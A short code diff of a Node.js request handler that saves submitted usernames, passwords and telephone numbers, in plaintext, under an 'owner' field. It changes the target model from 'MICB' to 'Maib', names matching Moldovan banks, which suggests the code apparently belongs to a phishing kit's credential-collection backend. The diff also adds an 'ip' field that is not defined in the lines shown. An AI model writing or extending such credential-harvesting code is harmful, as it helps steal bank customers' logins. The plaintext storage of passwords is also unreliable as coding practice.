@@ -41,15 +41,16 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
   const { username, password, telephone, uniqueid, owner } = req.body;
   try {
-    await MICB.create({
+    await Maib.create({
       uniqueid,
       username,
       password,
       telephone,
-      owner,
       status: 1,
+      owner,
+      ip,
       timestamp: moment().format(),
-    }).exec();
+    });
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
